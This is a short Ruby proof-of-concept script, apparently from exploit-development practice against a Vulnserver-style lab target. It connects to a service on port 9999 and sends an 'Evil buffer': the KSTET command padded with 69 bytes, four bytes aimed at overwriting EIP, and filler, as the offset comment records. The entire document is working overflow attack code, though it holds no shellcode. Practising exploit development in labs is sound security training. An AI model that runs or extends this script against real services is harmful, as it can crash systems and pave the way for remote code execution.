#!/usr/bin/env ruby

require 'socket'

#EIP = 0x41336341 -> Offset = 69
badHeader = "KSTET ."
badData = "\x41" * 69
badData += "\x42" * 4
badData += "\x43" * (1000 - badData.size)

host = "192.168.0.78" # ARGV[0]
port = "9999"  # ARGV[1]

# Config Server
s = TCPSocket.open(host, port)
receive = s.recv(1024)
puts receive

puts "[+] Sending Evil buffer"
s.send(badHeader + badData, 0)
s.close